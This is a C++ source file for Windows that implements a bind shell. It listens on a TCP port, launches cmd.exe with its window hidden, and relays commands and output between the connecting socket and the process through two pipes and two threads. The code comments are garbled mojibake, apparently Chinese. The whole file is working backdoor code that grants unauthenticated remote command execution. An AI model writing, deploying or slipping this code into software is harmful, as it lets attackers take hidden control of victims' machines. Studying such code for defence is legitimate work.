#include "stdafx.h"
#include "DoublePipe.h"

BOOL SockInit()
{

	WSADATA wsData = { 0 };
	if (WSAStartup(MAKEWORD(2, 2), &wsData) == NO_ERROR)
	{
		return TRUE;
	}
	else {
	
		return FALSE;
	}
	return 0;
}

BOOL StartShell(UINT port)
{
	//��ʼ��socket
	if (!SockInit()) return FALSE;
	//����socket
	SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (serverSocket == INVALID_SOCKET) return FALSE;
	//��ָ���˿�
	sockaddr_in sServer = { 0 };
	sServer.sin_family = AF_INET;
	sServer.sin_addr.s_addr = htonl(INADDR_ANY);
	sServer.sin_port = htons(port);
	if (bind(serverSocket,(sockaddr*) &sServer, sizeof(sServer)) == SOCKET_ERROR)
	{
		return FALSE;
	}
	//��ʼ���������ҽ�������
	if (listen(serverSocket, 5) == SOCKET_ERROR)
	{
		return FALSE;
	}

	SOCKET cSocket = accept(serverSocket, NULL, NULL);
	//��ʼ�����ܵ����ܵ��ǵ���ģ����Դ��������ܵ���
	//һ�������һ������д
	
	HANDLE hReadPipe1, hWritePipe1;//�ܵ�1 �Ķ�д
	HANDLE hReadPipe2, hWritePipe2;//�ܵ�2�Ķ�д

	SECURITY_ATTRIBUTES sa = { 0 };
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	if (!CreatePipe(&hReadPipe1, &hWritePipe1, &sa, 0) ||
		!CreatePipe(&hReadPipe2, &hWritePipe2, &sa, 0))
		return FALSE;
	//����cmd.exe�������������Ĺܵ�ͨ��
	//����������������
	STARTUPINFO si = {0};
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	//cmd�ı�׼�������ӵ��ܵ�1�Ķ�ȡ��
	si.hStdInput = hReadPipe1;
	//cmd�ı�׼������ӵ��ܵ�2��д���
	si.hStdOutput = si.hStdError = hWritePipe2;
	//����������Ϊ����
	si.wShowWindow = SW_HIDE;
	//��ȡcmd.exe��ϵͳ·��
	TCHAR tCmdPath[MAX_PATH] = { 0 };
	GetSystemDirectory(tCmdPath, MAX_PATH);//��ȡϵͳ·��
	lstrcat(tCmdPath, TEXT("\\cmd.exe"));
	//wcscat_s(tCmdPath, MAX_PATH, TEXT("\\cmd.exe"));
	//��ʼ����cmd����
	PROCESS_INFORMATION pi = { 0 };
	if (!CreateProcess(tCmdPath,
		NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
		return FALSE;
	//���濪ʼ���������̣߳�һ���Ƕ��߳�,��socket��ȡ����д��ܵ�1��һ����д�̣߳��ӹܵ�2��ȡ���ݣ�д��socket
	ComNode mReadNode, mWriteNode;
	mReadNode.socket = mWriteNode.socket = cSocket;
	mReadNode.pipe = hWritePipe1;
	mWriteNode.pipe = hReadPipe2;
	//�����������̣߳���������ͨ�Žڵ���Ϊ���������̴߳�������
	DWORD dwThreadOutput=0, dwThreadInput=0;
	HANDLE hThreadInput = CreateThread(NULL, 0, ThreadInput, &mReadNode, 0, &dwThreadInput);
	HANDLE hThreadOutput = CreateThread(NULL, 0, ThreadOutput, &mWriteNode, 0, &dwThreadOutput);
	

	HANDLE szHandles[] = { hThreadOutput ,hThreadInput };
	//ͬ���߳�
	WaitForMultipleObjects(2, szHandles, TRUE, INFINITE);


	return TRUE;
}

DWORD WINAPI ThreadInput(LPVOID lppara)
{
	ComNode mReadNode = *(pComNode)lppara;
	char tBuffer[MAX_PATH] = { 0 };
	while (TRUE)
	{
		DWORD dwWrited = 0;
		DWORD dwRecvd = recv(mReadNode.socket, tBuffer, MAX_PATH, 0);
		if (dwRecvd > 0 && dwRecvd != SOCKET_ERROR) 
		{
			WriteFile(mReadNode.pipe, tBuffer, dwRecvd, &dwWrited, NULL);
		}
		else {
			closesocket(mReadNode.socket);//�ر�socket
			mReadNode.socket = INVALID_SOCKET;
			WriteFile(mReadNode.pipe, 
				"exit\r\n", sizeof("exit\r\n"), 
				&dwWrited, NULL);
			return FALSE;
		}
		Sleep(50);
	}
	return TRUE;
}

#define PIPEBUFFERLEN 4096
DWORD WINAPI ThreadOutput(LPVOID lppara)
{
	ComNode mWriteNode = *(pComNode)lppara;
	char cBuffer[PIPEBUFFERLEN] = { 0 };
	char* pBuffer = NULL;

	DWORD dwTotalRead = 0;
	DWORD dwReadedLen = 0;
	BOOL bRet = FALSE;
	while (TRUE)
	{
		if (mWriteNode.socket == INVALID_SOCKET) {
			return FALSE;
		}
		bRet = PeekNamedPipe(mWriteNode.pipe, NULL, 0, NULL, &dwTotalRead, NULL);

		if (bRet&&dwTotalRead > 0)
		{
			//��ȡ�ܵ��е����ݣ������͵�socket��
			bRet = ReadFile(mWriteNode.pipe, cBuffer, PIPEBUFFERLEN, &dwReadedLen, NULL);
			if (bRet && dwReadedLen > 0)
			{

				DWORD dwSendLen = 0;
				pBuffer = cBuffer;
				do {

					dwSendLen = send(mWriteNode.socket, pBuffer, dwReadedLen, 0);
					pBuffer += dwSendLen;
					dwReadedLen -= dwSendLen;
				
				} while (dwSendLen > 0);
				

			}
		}

		Sleep(50);
		
	}
	return TRUE;
}
